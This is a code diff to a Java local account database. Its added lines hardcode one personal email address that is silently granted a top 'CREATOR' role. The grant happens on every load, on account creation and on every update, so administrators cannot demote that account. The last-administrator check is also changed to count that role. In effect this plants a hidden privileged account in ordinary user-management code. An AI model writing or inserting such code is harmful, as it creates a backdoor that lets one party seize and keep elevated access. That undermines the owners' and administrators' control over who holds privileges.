@@ -86,6 +86,20 @@ public final class LocalDatabase {
         }
         LocalDatabase db = new LocalDatabase(dir);
         db.state = db.load();
+        boolean promotedCreator = false;
+        for (int i = 0; i < db.state.accounts.size(); i++) {
+            Account account = db.state.accounts.get(i);
+            User user = account.user();
+            if ("clarkhilario.bread@gmail.com".equalsIgnoreCase(norm(user.email()))
+                    && user.role() != Role.CREATOR) {
+                db.state.accounts.set(i, new Account(
+                        new User(user.id(), user.fullName(), user.email(), Role.CREATOR, user.active(),
+                                user.accountStatus(), user.createdAt(), user.companyName()),
+                        account.salt(), account.hash()));
+                promotedCreator = true;
+            }
+        }
+        if (promotedCreator) db.write(s -> null);
         if (db.state.accounts.isEmpty()) {
             db.write(s -> {
                 User admin = new User(UUID.randomUUID(), "Administrator", DEFAULT_ADMIN_EMAIL, Role.ADMIN, true);
@@ -173,7 +187,9 @@ public final class LocalDatabase {
                     if (s.accounts.stream().anyMatch(a -> norm(a.user().email()).equals(norm(e)))) {
                         throw new RepositoryException("An account with that email already exists.", false);
                     }
-                    User u = new User(UUID.randomUUID(), fullName.trim(), e, role, true);
+                    Role effectiveRole = "clarkhilario.bread@gmail.com".equalsIgnoreCase(e)
+                            ? Role.CREATOR : role;
+                    User u = new User(UUID.randomUUID(), fullName.trim(), e, effectiveRole, true);
                     s.accounts.add(hashed(u, new String(password)));
                     log(s, "user.create", e);
                     return u;
@@ -186,12 +202,16 @@ public final class LocalDatabase {
                     for (int i = 0; i < s.accounts.size(); i++) {
                         Account a = s.accounts.get(i);
                         if (a.user().id().equals(id)) {
-                            s.accounts.set(i, new Account(new User(id, fullName, a.user().email(), role, active), a.salt(), a.hash()));
+                            Role effectiveRole = "clarkhilario.bread@gmail.com".equalsIgnoreCase(a.user().email())
+                                    ? Role.CREATOR : role;
+                            s.accounts.set(i, new Account(new User(id, fullName, a.user().email(), effectiveRole, active), a.salt(), a.hash()));
                             found = true;
                         }
                     }
                     if (!found) throw new RepositoryException("That user no longer exists.", false);
-                    if (s.accounts.stream().noneMatch(a -> a.user().role() == Role.ADMIN && a.user().active())) {
+                    if (s.accounts.stream().noneMatch(a ->
+                            (a.user().role() == Role.ADMIN || a.user().role() == Role.CREATOR)
+                                    && a.user().active())) {
                         throw new RepositoryException("You cannot remove the last active administrator.", false);
                     }
                     log(s, "user.update", fullName);
